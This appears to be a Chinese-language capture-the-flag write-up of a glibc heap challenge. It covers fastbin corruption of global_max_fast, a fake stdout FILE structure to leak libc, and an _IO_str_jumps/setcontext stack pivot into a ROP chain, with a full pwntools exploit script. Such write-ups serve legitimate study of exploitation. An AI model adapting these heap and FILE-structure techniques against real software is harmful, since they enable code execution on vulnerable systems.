/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
    FD = P->fd;								      \
    BK = P->bk;
```

P.S. glibc 2.25 source code 並沒有這段檢查，至少要在 glibc 2.26 才會有，不過官方提供的 library 是有這個檢查機制的

到這邊， `heap_base + 0x100` 開始即是 fake `_IO_2_1_stdout_` 的起頭，除了 `write` 相關的 pointer 以及 flag，其他都與 `_IO_2_1_stdout_` 相同。下一步要修改用來定義 fastbin size 的 `global_max_fast`，由於 fastbinsY 的大小只有 `NFASTBINS` (10)，而在 `global_max_fast` 被更動的情況下，如果 size 超過 `MAX_FAST_SIZE` 的 chunk 其 address 會直接往後蓋，因此可以覆蓋任何 `fastbinsY` 以後的 address 成自己的 pointer，而與 `fastbinsY` 的 offset 為 `(target - fastbinY) * 2 + 0x10` (因為 size 每 0x10 會佔一個 bin)，因此可以透過此方式改寫 `stdout` variable，讓他指向我們的 fake `_IO_2_1_stdout_`。 
(修改 `MAX_FAST_SIZE` 在 glibc 2.31 已經沒辦法 work)

主要更動的地方只有 `write_base` 以及 `_flags | _IO_IS_APPENDING`，讓 `new_do_write` 時先進入 `if (fp->_flags & _IO_IS_APPENDING)` 此 condition 即可:

```python
# fake _IO_2_1_stdout_ start from heap_base + 0x100
edit(0x100, p32(0xfbad3887)) # _flags == 0xfbad2887 | _IO_IS_APPENDING
edit(0x108, p64(0)) # read_ptr
edit(0x110, p64(0)) # read_end
edit(0x110, p64(0)) # read_base
edit(0x120, p16(0xc610)) # write_base (stdout + 0x10)
edit(0x128, p16(0xc683)) # write_ptr
edit(0x130, p16(0xc683)) # write_end
edit(0x138, p16(0xc683)) # buf_base
edit(0x140, p16(0xc684)) # buf_end
edit(0x148, p64(0)*4) # save_base, backup_base, save_end, markers
edit(0x168, p16(0xb8c0)) # chain
edit(0x170, p32(1)) # fileno
edit(0x174, p32(0)) # _flags2
edit(0x178, p64(2**64 - 1)) # _old_offset
edit(0x180, p64(0)) # _cur_column _vtable_offset _shortbuf
edit(0x188, p16(0xd760)) # _lock
edit(0x190, p64(2**64 - 1)) # _offset
edit(0x198, p64(0)) # _codecvt
edit(0x1a0, p16(0xb780)) # _wide_data
edit(0x1a8, p64(0) * 3) # _freeres_list, _freeres_buf, __pad5
edit(0x1c0, p32(2**32 - 1)) # _mod
edit(0x1c4, p32(0) + p64(0)*2) # _unused2
edit(0x1d8, p16(0x8440)) # vtable
```

之後透過 `free()` chunk 就能 leak libc address。

下一步繼續利用 fastbin chunk 來覆蓋掉特定 libc 位置，這次的目標為改寫 `_IO_list_all` 成另一個 fake `FILE`，目標是利用 `exit()` 時對每個 `FILE` 執行 `vtable->overflow`，而若此時 vtable 為 `_IO_str_jumps`，就能利用控制 `_IO_buf_end` 以及 `_allocate_buffer` (0xe0)，呼叫 `_IO_str_overflow` 來執行 `(_allocate_buffer) (_IO_buf_end)`:

```c
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  ...
	  if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
		return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
     ...
```

而此時將 `_allocate_buffer` 設為 `setcontext+53`，就能控制 rsp + `push rcx ; ret`:

```c
<setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
<setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
<setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
<setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
<setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
<setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
<setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
<setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
<setcontext+94>:      push   rcx
<setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
<setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
<setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
<setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
<setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
<setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
<setcontext+125>:     xor    eax,eax
<setcontext+127>:     ret    
```

而如果要執行到能控制的 rop，`[rdi+0xa0]` 就必須為指定位置，這邊找了一個指向 `__default_morecore` 的 function pointer `__morecore`，並且將 `rdi` 傳入 `__morecore - 8 - 0xa0`，這邊 -8 的原因是因為 `mov rcx,QWORD PTR [rdi+0xa8] ; push rcx ; ret`。在 push 後會把 `__default_morecore` push 到 stack 上，並在最後值型，而這邊選 `__morecore` 的原因也是因為 `[rdi+0xa8]` 要是一個可執行 + 不會弄壞 stack 的 function。`__default_morecore` 雖然會執行 `sbrk` 會失敗，但是不會 crash，因此能在 `ret` 後執行 ROP:

```c
<__default_morecore>:         sub    rsp,0x8
<__default_morecore+4>:       call   0x155555072500 <sbrk>
<__default_morecore+9>:       mov    edx,0x0
<__default_morecore+14>:      cmp    rax,0xffffffffffffffff
<__default_morecore+18>:      cmove  rax,rdx
<__default_morecore+22>:      add    rsp,0x8
<__default_morecore+26>:      ret
```

而 ROP 一樣是透過 fastbin chunk 的方式改寫 `_morecore - 8` 為 `heap + 0x3000`，並在 `heap + 0x3000` 堆 ROP，最後就能順利執行 ROP chain。完整 exploit 如下:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./H", env={"LD_PRELOAD": "./libc.so.6"}, aslr=False)
gdb.attach(r, """
c
""")

"""
1. malloc
2. edit
3. free
"""

def malloc(sz):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('size: ', str(sz))

def edit(off, ct):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('offset: ', str(off))
    r.sendlineafter('size: ', str(len(ct)))
    r.sendafter('content: ', ct)

def free(off):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('offset: ', str(off))

global_max_fast_poff = 0xd7d0
stdout_write_base_poff = 0xc610
chk_sz = 0x420

for i in range(0xe):
    edit(0xf8 + i*0x10, p64(0x201))
for i in range(0x10):
    edit(0x2f8 + i*0x10, p64(0x21))
for i in range(0xd):
    free(0x1d0 - i*0x10)
    malloc(0x1f0)

"""
0xfbad3c80 == _IO_IS_FILEBUF | _IO_IS_APPENDING --> 0x3000
              _IO_TIED_PUT_GET | _IO_CURRENTLY_PUTTING --> 0xc00
              _IO_LINKED --> 0x80
0xfbad2887 == _IO_IS_FILEBUF --> 0x2000
              _IO_CURRENTLY_PUTTING --> 0x800
              _IO_LINKED --> 0x80
              _IO_USER_BUF | _IO_UNBUFFERED | _IO_NO_READS --> 0x7
"""
# fake _IO_2_1_stdout_ start from heap_base + 0x100
edit(0x100, p32(0xfbad3887)) # _flags == 0xfbad2887 | _IO_IS_APPENDING
edit(0x108, p64(0)) # read_ptr
edit(0x110, p64(0)) # read_end
edit(0x110, p64(0)) # read_base
edit(0x120, p16(0xc610)) # write_base (stdout + 0x10)
edit(0x128, p16(0xc683)) # write_ptr
edit(0x130, p16(0xc683)) # write_end
edit(0x138, p16(0xc683)) # buf_base
edit(0x140, p16(0xc684)) # buf_end
edit(0x148, p64(0)*4) # save_base, backup_base, save_end, markers
edit(0x168, p16(0xb8c0)) # chain
edit(0x170, p32(1)) # fileno
edit(0x174, p32(0)) # _flags2
edit(0x178, p64(2**64 - 1)) # _old_offset
edit(0x180, p64(0)) # _cur_column _vtable_offset _shortbuf
edit(0x188, p16(0xd760)) # _lock
edit(0x190, p64(2**64 - 1)) # _offset
edit(0x198, p64(0)) # _codecvt
edit(0x1a0, p16(0xb780)) # _wide_data
edit(0x1a8, p64(0) * 3) # _freeres_list, _freeres_buf, __pad5
edit(0x1c0, p32(2**32 - 1)) # _mod
edit(0x1c4, p32(0) + p64(0)*2) # _unused2
edit(0x1d8, p16(0x8440)) # vtable

edit(0x1008, p64(0x91))
edit(0x1098, p64(0x21))
edit(0x10b8, p64(0x21))
free(0x1010)
edit(0x1018, p16(global_max_fast_poff - 0x10))
malloc(0x80) # overwrite global_max_fast to a large value

edit(0x108, p64(0x17e1)) # &stdout
edit(0x18e8, p64(0x21))
edit(0x1908, p64(0x21))
free(0x110)
libc = u64(r.recv(8)) - 0x39e683
__morecore_8 = libc + 0x39e388
_IO_str_jumps = libc + 0x39a080
setcontext = libc + 0x43565 # offset 53
info(f"""
libc: {hex(libc)}
fastbinsY: {hex(libc + 0x39db00)}
""")

edit(0x1008, p64(0x1411)) # &_IO_list_all
edit(0x2418, p64(0x21))
edit(0x2438, p64(0x21))
free(0x1010)

# call _IO_file_overflow -> (setcontext+53)(__morecore_8 - 0xa0)
fake = b''.ljust(0x28, b'\x00')
fake += p64(0xaaaabbbbccccdddd) # write_ptr
fake = fake.ljust(0x40, b'\x00')
fake += p64((__morecore_8 - 0xa0 - 100) // 2) # 0x40 ~ 0x48 buf_end --> __morecore_8 - 0xa0
fake = fake.ljust(0xd8, b'\x00')
fake += p64(_IO_str_jumps) # vtable
fake += p64(setcontext) # _allocate_buffer
edit(0x1000, fake)

edit(0x2008, p64(0x1121)) # [__morecore_8] = heap_base + 0x2000
edit(0x3128, p64(0x21))
edit(0x3148, p64(0x21))
free(0x2010)

pop_rax_ret = libc + 0x36d98
pop_rdi_ret = libc + 0x1feea
pop_rsi_ret = libc + 0x1fe95
pop_rdx_ret = libc + 0x1b92
syscall_ret = libc + 0xaa6b5
buf = libc + 0x39f000

rop = flat([
    # read(0, buf, 0x4)
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, buf,
    pop_rdx_ret, 0x4,
    syscall_ret,

    # open("flag", O_RDONLY)
    pop_rax_ret, 2,
    pop_rdi_ret, buf,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    syscall_ret,

    # read(0, buf, 0x30)
    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, buf,
    pop_rdx_ret, 0x30,
    syscall_ret,

    # write(1, buf, 0x30)
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, buf,
    pop_rdx_ret, 0x30,
    syscall_ret,
])

edit(0x2000, rop)
r.sendline("A")
sleep(0.1)
r.send("flag")

r.interactive()
```



- `setcontext()`:  The function setcontext() restores the **user context pointed at by ucp**
  - ucp == `ucontext_t` pointer (?)



---



官方解法利用 largebin attack + 蓋 `stdout` 來 libc，但是過程基本上是一樣的，最後 exploit 的部分走 `_dl_open_hook` ，沒有仔細追，過程大致如下:

`_int_free` -> `malloc_printerr` -> `__libc_message` -> `BEFORE_ABORT()` (`backtrace_and_maps()`) -> `__backtrace()` -> `__libc_once()` -> `INIT_FUNCTION()`(sysdeps/generic/libc-lock.h) 也就是 `init()` 被執行 -> (sysdeps/x86_64/backtrace.c) -> `__libc_dlopen()` (實際執行 `__libc_dlopen_mode()`) (elf/dl-libc.c):

```c
void *
__libc_dlopen_mode (const char *name, int mode)
{
  struct do_dlopen_args args;
  args.name = name;
  args.mode = mode;
  args.caller_dlopen = RETURN_ADDRESS (0);

#ifdef SHARED
  if (__glibc_unlikely (_dl_open_hook != NULL))
    return _dl_open_hook->dlopen_mode (name, mode);
...
```

and `__libc_dlsym()`:

```c
void *
__libc_dlsym (void *map, const char *name)
{
  struct do_dlsym_args args;
  args.map = map;
  args.name = name;

#ifdef SHARED
  if (__glibc_unlikely (_dl_open_hook != NULL))
    return _dl_open_hook->dlsym (map, name);
...
```

control `rbx` (`[_dl_open_hook]`) 並執行 `call [rbx]`，也就是 `**_dl_open_hook`，如果能再配合 `call qword ptr [rbx + 0x40]` + `setcontext` 來 control RSP，一樣能 stack pivoting + ROP。



- `repz ret`: repz is a prefix that **repeats the following instruction** until **some register is 0**. Also, it only works on string instructions; otherwise the behavior is undefined. So what on earth is gcc doing generating a repz retq?

